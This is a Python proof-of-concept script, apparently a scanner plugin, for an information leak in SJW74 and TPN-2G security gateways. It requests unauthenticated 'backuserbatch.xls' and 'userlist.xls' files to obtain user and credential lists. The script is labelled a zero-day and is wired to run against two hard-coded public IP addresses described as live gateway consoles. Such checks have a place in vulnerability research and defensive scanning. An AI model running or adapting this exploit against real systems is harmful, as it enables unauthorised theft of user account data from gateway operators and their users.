#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  SJW74系列安全网关 和 全网行为管理TPN-2G安全网关 2处认证信息泄露 
Author    :  a
mail      :  a@lcx.cc
 
refer :  0day
"""
import urllib.parse
import time

def assign(service, arg):
    if service == 'adtsec_gateway':
        arr = urllib.parse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    payloads=['backuserbatch.xls','userlist.xls']
    for payload in payloads:  
        url = arg+payload
        code, head, res, errcode, _ = curl.curl2(url)
        if code==200 and 'vnd.ms-excel' in head:
            security_warning(url)
            
if __name__ == '__main__':
    from dummy import *
    audit(assign('adtsec_gateway', 'http://211.144.102.114:8080/')[1]) # TPN-2G网关控制台
    audit(assign('adtsec_gateway', 'http://60.174.80.249:8080/')[1]) #SJW74 VPN网关控制台